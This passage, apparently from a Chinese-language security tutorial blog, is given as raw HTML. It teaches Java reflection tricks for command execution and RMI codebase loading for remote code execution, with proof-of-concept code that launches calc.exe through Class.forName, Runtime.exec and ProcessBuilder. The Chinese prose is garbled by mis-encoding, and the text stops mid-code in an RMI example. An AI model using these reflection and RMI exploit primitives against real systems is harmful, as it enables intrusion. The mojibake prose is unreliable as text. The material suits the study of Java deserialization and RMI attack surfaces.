&lt;p>ç”±æ­¤ï¼Œå¦‚æœ&lt;code>forName&lt;/code>çš„å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™æ¶æ„ç±»ï¼ˆæ¶æ„ä»£ç ä½äºstaticä¸­ï¼‰ï¼Œè¿›è€Œæ‰§è¡Œï¼›ç¼–å†™poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">victim&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ref.exp&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">exp&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#111">rt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">ps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">rt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;error here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="getmethodgetdeclaredmethod">getMethod&amp;amp;getDeclaredMethod&lt;/h3>
&lt;p>&lt;code>Class.newInstance&lt;/code>è°ƒç”¨çš„æ˜¯è¯¥ç±»çš„publicæ— å‚æ„é€ å‡½æ•°ï¼Œè€Œæœ‰å‚æ•°çš„æ„é€ æ–¹æ³• æˆ–é&lt;code>public&lt;/code>çš„æ„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡&lt;code>Class.newInstance()&lt;/code>è°ƒç”¨ï¼Œæ¯”å¦‚&lt;code>Runtime&lt;/code>çš„æ„é€ æ–¹æ³•å°±æ˜¯ç§æœ‰çš„ï¼ˆå•ä¾‹æ¨¡å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code>Runtime.getRuntime&lt;/code>è·å–åˆ°&lt;code>Runtime&lt;/code>å¯¹è±¡ï¼Œè¿™é‡ŒæŒ‡å®šçš„é‡è½½ä¸ºæœ€ç®€å•çš„&lt;code>exec&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦ä¸€ä¸ªAPIæ˜¯&lt;code>getDeclaredMethod&lt;/code>ï¼Œè·å–å½“å‰ç±»å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ˆä¸åŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³•&lt;/p>
&lt;p>ç»“åˆè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿™æ ·å¼¹è®¡ç®—å™¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¿…é¡»åŒæ—¶è®¾ç½®&lt;code>setAccessible(true)&lt;/code>&lt;/p>
&lt;h3 id="getconstructor">getConstructor&lt;/h3>
&lt;p>å½“ä¸€ä¸ªç±»æ²¡æœ‰publicçš„æ— å‚æ„é€ æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆç”¨&lt;code>getConstructor&lt;/code>è·å–åˆ°æ„é€ å‡½æ•°ï¼Œå†ç”¨&lt;code>newInstance&lt;/code>æ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">))).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœç›®æ ‡ç¯å¢ƒæ²¡æœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡å€ŸåŠ©åå°„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆè·å–åˆ°&lt;code>start&lt;/code>æ–¹æ³•ï¼Œç„¶å&lt;code>invoke&lt;/code>æ‰§è¡Œï¼Œinvoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ProcessBuilder Object&lt;/p>
&lt;p>å¦‚æœè¦ä½¿ç”¨ProcessBuilderçš„å¦ä¸€ä¸ªé‡è½½ï¼ˆå‚æ•°ä¸ºå¯å˜é•¿å‚æ•°ï¼‰ï¼Œå¯ä»¥è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[][]{{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}})).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi-1">RMI&lt;/h2>
&lt;p>å³Remote Method Invocationï¼Œä¸è®©å®ƒRCEéƒ½å¯¹ä¸èµ·è¿™ä¸ªR&lt;/p>
&lt;h3 id="é€šä¿¡å®ç°">é€šä¿¡å®ç°&lt;/h3>
&lt;p>Serverç¼–å†™å®ç°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡createRegistryï¼ŒClientæŸ¥æ‰¾æœåŠ¡å¹¶è·å¾—æ¥å£å®ä¾‹getRegistryï¼Œä¸¤è€…å…±äº«ç›¸åŒçš„æ¥å£interface&lt;/p>
&lt;p>å½“Clientè¿æ¥æ—¶ï¼Œé¦–å…ˆè¿æ¥Registryå¹¶å¯»æ‰¾æƒ³è¦çš„å¯¹è±¡ï¼Œå‘é€Callæ¶ˆæ¯ï¼›ä¹‹åServerè¿”å›å¯¹è±¡ï¼ˆåºåˆ—åŒ–æ•°æ®ï¼‰ï¼ŒReturnDataæ¶ˆæ¯ï¼›Clientæ”¶åˆ°åååºåˆ—åŒ–å¾—åˆ°è¿œç¨‹å¯¹è±¡ï¼Œä¸å…¶å»ºç«‹TCPè¿æ¥ï¼Œåœ¨è¿™ä¸ªæ–°çš„è¿æ¥ä¸­æ‰ä¼šåœ¨Serverç«¯æ‰§è¡Œæ–¹æ³•è°ƒç”¨&lt;/p>
&lt;p>å¯ä»¥ç›´æ¥é€šè¿‡rmi://xxx:xxx/è¿™æ ·çš„åœ°å€è·å–æ‰€æœ‰ç»‘å®šçš„å¯¹è±¡ï¼ˆç›´é€šRMI Registryåå°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://ip:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºrebind, bind, unbindè¿™æ ·çš„å±é™©æ–¹æ³•åªæœ‰å½“æ¥æºæ˜¯locahostæ‰è¡Œï¼Œè¿œç¨‹ç”¨ä¸äº†&lt;/p>
&lt;p>å¯¹äºååºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥ç”¨&lt;a href="https://github.com/NickstaDB/SerializationDumper/releases/">SerializationDumper&lt;/a>è¿›è¡Œåˆ†æ&lt;/p>
&lt;h3 id="codebase-to-rce">codebase to RCE&lt;/h3>
&lt;p>codebaseæ˜¯ç±»ä¼¼CLASSPATHçš„ä¸€ä¸ªåœ°å€ï¼Œå‘ŠçŸ¥JVMå»å“ªé‡Œæœç´¢ç±»ï¼Œå¸¸ç”¨äºhttp, ftpè¿™æ ·çš„æƒ…å†µ&lt;/p>
&lt;p>åœ¨RMIé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œååºåˆ—åŒ–å¯¹è±¡æ—¶å¯»æ‰¾ç±»æ—¶å…ˆåœ¨è‡ªå·±çš„CLASSPATHä¸‹å¯»æ‰¾ï¼Œå¦‚æœæœ¬åœ°æ‰¾ä¸åˆ°å°±å›å»è¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»&lt;/p>
&lt;p>å¦‚æœcodebaseå¯æ§ï¼Œå†æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œå°±å¯ä»¥åŠ è½½æ¶æ„ç±»äº†ï¼š&lt;/p>
&lt;ul>
&lt;li>å®‰è£…å¹¶é…ç½®äº†SecurityManager&lt;/li>
&lt;li>Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº† java.rmi.server.useCodebaseOnly=false&lt;/li>
&lt;/ul>
&lt;p>java.rmi.server.useCodebaseOnly æ˜¯åœ¨Java 7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼Œå€¼ç”±falseæ”¹ä¸ºäº†trueï¼›åœ¨ä¸ºtrueçš„æƒ…å†µä¸‹JVMåªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebaseï¼Œä¸æ”¯æŒä»RMIä¸­è·å–&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Calc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
